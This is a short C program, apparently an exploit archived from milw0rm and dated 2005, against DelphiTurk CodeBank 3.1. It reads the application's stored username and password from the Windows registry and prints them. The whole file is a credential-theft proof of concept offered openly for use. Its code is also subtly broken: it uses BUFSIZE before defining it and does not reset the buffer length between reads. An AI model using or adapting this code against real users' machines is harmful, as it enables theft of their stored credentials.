/*******************************************************************
 
DelphiTurk CodeBank Local Exploit
 
Application: DelphiTurk CodeBank 3.1 (and previous versions)
Procuder: Delphiturk.com
Vulnerable Description: Delhiturk CodeBank discloses username and password to
local users.
 
 
Coded by: Kozan
Web: www.netmagister.com
Mail: kozan[at]netmagister[dot]com
 
*******************************************************************/
 
 
#include <stdio.h>
#include <windows.h>
 
HKEY hKey;
char username[BUFSIZE], password[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;
#define BUFSIZE 100
 
int main(void)
{
 
	 if(RegOpenKeyEx(HKEY_CURRENT_USER,
					"Software\\DelphiTurk\\Codebank",
					0,
					KEY_QUERY_VALUE,
					&hKey) == ERROR_SUCCESS)
	 {
 
            lRet = RegQueryValueEx( hKey, "username", NULL, NULL,
               (LPBYTE) username, &dwBufLen);
 
			if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ){
				 RegCloseKey(hKey);
				 printf("En error occured!");
				 return 0;
			}
 
 
			lRet = RegQueryValueEx( hKey, "password", NULL, NULL,
               (LPBYTE) password, &dwBufLen);
 
			if( (lRet != ERROR_SUCCESS) || (dwBufLen > BUFSIZE) ){
				 RegCloseKey(hKey);
				 printf("En error occured!");
				 return 0;
			}
            RegCloseKey( hKey );
			printf("DelphiTurk CodeBank Local Exploit by Kozan\n\n");
			printf("Username: %s\n",username);
			printf("Password: %s\n",password);
 
 
	 }
	 else{
		 printf("DelphiTurk Codebank is not installed on your system!");
	 }
 
 
	return 0;
}


// milw0rm.com [2005-02-08]
